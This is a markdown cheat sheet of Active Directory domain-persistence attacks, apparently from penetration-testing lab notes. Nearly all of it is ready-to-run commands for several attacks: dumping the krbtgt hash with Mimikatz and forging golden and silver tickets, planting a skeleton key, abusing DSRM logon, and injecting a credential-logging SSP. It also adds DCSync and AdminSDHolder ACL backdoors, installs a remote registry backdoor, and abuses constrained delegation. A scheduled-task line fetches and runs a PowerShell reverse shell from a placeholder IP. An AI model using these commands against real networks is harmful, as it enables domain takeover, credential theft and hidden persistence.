# Domain persistence
* [Golden Ticket](#Golden-Ticket) 
* [Silver Ticket](#Silver-Ticket)
* [Skeleton Key](#Skeleton-Key)
* [DSRM](#DSRM)
* [Custom SSP - Track logons](#Custom-SSP---Track-logons)
* [ACL](#ACL)
  * [AdminSDHolder](#AdminSDHolder)
  * [DCsync](#DCsync)
  * [SecurityDescriptor - WMI](#SecurityDescriptor---WMI)
  * [SecurityDescriptor - Powershell Remoting](#SecurityDescriptor---Powershell-Remoting)
  * [SecurityDescriptor - Remote Registry](#SecurityDescriptor---Remote-Registry)
  * [msDS-AllowedToDelegateTo](#msDS-AllowedToDelegateTo)


## Golden ticket
- https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets

#### Dump hashes of DC
- Get the krbtgt hash
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
```

```
.\SafetyKatz.exe "lsadump::lsa /patch" "exit"
.\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

#### Create a Golden ticket
- Use /ticket instead of /ptt to save the ticket to file instead of loading in current powershell process
- To get the SID use ```Get-DomainSID``` from powerview
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /krbtgt:<HASH> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

```
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /krbtgt:<HASH> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

#### Use the DCSync feature for getting krbtgt hash. Execute with DA privileges
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
```

#### Check WMI Permission
```
Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
```

## Silver ticket
- https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets

#### Make silver ticket for CIFS service
- Use the hash of the local computer
- Other services are HOST, RPCSS, WSMAN
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /target:<TARGET> /service:CIFS /rc4:<LOCAL COMPUTER HASH> /user:Administrator /ptt"'
```

#### Check access (After CIFS silver ticket)
```
ls \\<SERVERNAME>\c$\
```

#### Make silver ticket for Host service
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /target:<TARGET> /service:HOST /rc4:<LOCAL COMPUTER HASH> /user:Administrator /ptt"'
```

#### Schedule and execute a task (After host silver ticket)
```
schtasks /create /S <target> /SC Weekly /RU "NT Authority\SYSTEM" /TN "Reverse" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1''')'"

schtasks /Run /S <target> /TN “Reverse”
```

#### Make silver ticket for WMI
Execute for WMI /service:HOST /service:RPCSS
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /target:<TARGET> /service:HOST /rc4:<LOCAL COMPUTER HASH> /user:Administrator /ptt"'

Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /target:<TARGET> /service:RPCSS /rc4:<LOCAL COMPUTER HASH> /user:Administrator /ptt"'
```

#### Check WMI Permission
```
Get-wmiobject -Class win32_operatingsystem -ComputerName <target>
```

## Skeleton key
- https://pentestlab.blog/2018/04/10/skeleton-key/

#### Create the skeleton key - Requires DA
```
Invoke-MimiKatz -Command '"privilege::debug" "misc::skeleton"' -Computername <target>
```

## DSRM
#### Dump DSRM password - dumps local users
look for the local administrator password
```
Invoke-Mimikatz -Command ‘”token::elevate” “lsadump::sam”’ -Computername <target>
```

#### Change login behavior for the local admin on the DC
```
New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD
```

#### If property already exists
```
Set-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2
```

#### Pass the hash for local admin
```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<computer> /user:Administrator /ntlm:<hash> /run:powershell.exe"'
```

## Custom SSP - Track logons
#### Mimilib.dll
Drop mimilib.dll to system32 and add mimilib to HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
```
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
$packages += "mimilib"
SetItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' Value $packages
```

#### Use mimikatz to inject into lsass
all logons are logged to C:\Windows\System32\kiwissp.log
```
Invoke-Mimikatz -Command ‘”misc:memssp”’
```

## ACL
### AdminSDHolder
- https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence

#### Check if student has replication rights
```
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "<username>") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

#### Add fullcontrol permissions for a user to the adminSDHolder
```
Add-ObjectAcl -TargetADSprefix ‘CN=AdminSDHolder,CN=System’ PrincipalSamAccountName <username> -Rights All -Verbose
```

#### Run SDProp on AD (Force the sync of AdminSDHolder)
```
Invoke-SDPropagator -showProgress -timeoutMinutes 1

#Before server 2008
Invoke-SDpropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

#### Check if user got generic all against domain admins group
```
Get-ObjectAcl -SamaccountName “Domain Admins” –ResolveGUIDS | ?{$_.identityReference -match ‘<username>’}
```

#### Add user to domain admin group
```
Add-DomainGroupMember -Identity ‘Domain Admins’ -Members <username> -Verbose
```

or

```
Net group "domain admins" sportless /add /domain
```

#### Abuse resetpassword using powerview_dev
```
Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force ) -Verbose
```

### DCsync
- https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync

#### Add full-control rights
```
Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,DC=local’ -PrincipalSamAccountName <username> -Rights All -Verbose
```

#### Add rights for DCsync
```
Add-ObjectAcl -TargetDistinguishedName ‘DC=dollarcorp,DC=moneycorp,Dc=local’ -PrincipalSamAccountName <username> -Rights DCSync -Verbose
```

#### Execute DCSync and dump krbtgt
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
```

### SecurityDescriptor - WMI
```
. ./Set-RemoteWMI.ps1
```

#### On a local machine
```
Set-RemoteWMI -Username <username> -Verbose
```

#### On a remote machine without explicit credentials
```
Set-RemoteWMI -Username <username> -Computername <computername> -namespace ‘root\cimv2’ -Verbose
```

#### On a remote machine with explicit credentials
Only root/cimv and nested namespaces
```
Set-RemoteWMI -Username <username> -Computername <computername> -Credential Administrator -namespace ‘root\cimv2’ -Verbose
```

#### On remote machine remove permissions
```
Set-RemoteWMI -Username <username> -Computername <computername> -namespace ‘root\cimv2’ -Remove -Verbose
```

#### Check WMI permissions
```
Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
```

### SecurityDescriptor - Powershell Remoting
```
. ./Set-RemotePSRemoting.ps1
```

#### On a local machine
```
Set-RemotePSRemoting -Username <username> -Verbose
```

#### On a remote machine without credentials
```
Set-RemotePSRemoting -Username <username> -Computername <computername> -Verbose
```

#### On a remote machine remove permissions
```
Set-RemotePSRemoting -Username <username> -Computername <computername> -Remove
```

### SecurityDescriptor - Remote Registry
Using the DAMP toolkit
```
. ./Add-RemoteRegBackdoor
. ./RemoteHashRetrieval
```

#### Using DAMP with admin privs on remote machine
```
Add-RemoteRegBackdoor -Computername <computername> -Trustee <username> -Verbose
```

#### Retrieve machine account hash from local machine
```
Get-RemoteMachineAccountHash -Computername <computername> -Verbose
```

#### Retrieve local account hash from local machine
```
Get-RemoteLocalAccountHash -Computername <computername> -Verbose
```

#### Retrieve domain cached credentials from local machine
```
Get-RemoteCachedCredential -Computername <computername> -Verbose
```

### msDS-AllowedToDelegateTo
#### Set msDS-AllowedToDelegateTo
```
Set-DomainObject -Identity devuser -Set @{serviceprincipalname='dev/svc'}
Set-DomainObject -Identity devuser -Set @{"msds-allowedtodelegateto"="ldap/us-dc.us.techcorp.local"}
Set-DomainObject -SamAccountName devuser1 -Xor @{"useraccountcontrol"="16777216"}
Get-DomainUser –TrustedToAuth
```

#### Abuse msDS-AllowedToDelegateTo Kekeo
```
kekeo# tgt::ask /user:devuser /domain:us.techcorp.local /password:Password@123!

kekeo# tgs::s4u /tgt:TGT_devuser@us.techcorp.local_krbtgt~us.techcorp.local@us.techcorp.local.kirbi /user:Administrator@us.techcorp.local /service:ldap/us-dc.us.techcorp.local

Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@us.techcorp.local@us.techcorp.local_ldap~us-dc.us.techcorp.local@us.techcorp.local.kirbi"'

Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```

#### Abuse Rubeus:
```
Rubeus.exe hash /password:Password@123! /user:devuser /domain:us.techcorp.local

Rubeus.exe s4u /user:devuser /rc4:539259E25A0361EC4A227DD9894719F6 /impersonateuser:administrator /msdsspn:ldap/us-dc.us.techcorp.local /domain:us.techcorp.local /ptt

C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```
